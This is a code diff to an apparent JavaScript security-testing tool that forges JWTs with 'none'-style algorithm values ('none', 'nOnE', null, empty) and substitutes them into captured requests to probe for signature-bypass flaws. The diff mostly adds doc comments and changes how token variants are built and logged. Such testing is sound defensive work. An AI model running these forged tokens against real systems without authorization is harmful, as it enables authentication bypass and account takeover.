@@ -47,6 +47,7 @@ function parseJWT(jwt) {
  * @param {Object} header - JWT header object
  * @param {Object} payload - JWT payload object
  * @param {string} signature - JWT signature
+ * @param {boolean} [stripeq=true] - Flag to remove padding from the JWT
  * @returns {string} New JWT string
  */
 function generateJWT(header, payload, signature = '', stripeq=true) {
@@ -58,6 +59,11 @@ function generateJWT(header, payload, signature = '', stripeq=true) {
     
   }
 
+/**
+ * Creates variants of a given JWT token
+ * @param {string} jwt - The original JWT token
+ * @returns {Array} An array of JWT variants
+ */
 function createVariants(jwt) {
     const variants = [];
     variants.push(jwt);
@@ -74,10 +80,9 @@ function createVariants(jwt) {
  * Tests JWT with various "none" algorithms
  * @param {Object} parsedJWT - Parsed JWT components
  * @param {string} originalJWT - Original JWT token
- * @param {string} headerName - Header name containing JWT
- * @param {Object} sdk - SDK instance for sending requests
- * @param {Object} request - Original request object
- * @returns {Object} Results of the none algorithm tests
+ * @param {string} input - Input string containing the original JWT
+ * @param {boolean} [variances=true] - Flag to create variants of the JWT
+ * @returns {Array} Results of the none algorithm tests
  */
 function testNoneAlgorithm(parsedJWT, originalJWT, input, variances=true) {
     const noneAlgs = ["none", "nOnE", "NONE", null, 0, ""];
@@ -87,7 +92,12 @@ function testNoneAlgorithm(parsedJWT, originalJWT, input, variances=true) {
       const modifiedHeader = { ...parsedJWT.header, alg };
       const newJWT = generateJWT(modifiedHeader, parsedJWT.payload, parsedJWT.signature);
       if(variances){
-        results.push(createVariants(input.replace(originalJWT, newJWT)));
+        const vars=createVariants(newJWT);
+        const reqs=vars.map(v => {
+          return input.replace(originalJWT, v);
+        });
+        console.log(reqs);
+        results.push(...reqs);
       }
       else{
         results.push(input.replace(originalJWT, newJWT));
@@ -96,6 +106,11 @@ function testNoneAlgorithm(parsedJWT, originalJWT, input, variances=true) {
     return results;
   }
 
+ /**
+ * Runs the process to test JWTs with "none" algorithms
+ * @param {string} input - Input string containing the JWTs
+ * @returns {Array} Results of the none algorithm tests
+ */ 
 function run(input) {
     const jwts = extractJWTs(input);
     if (jwts.length === 0) {
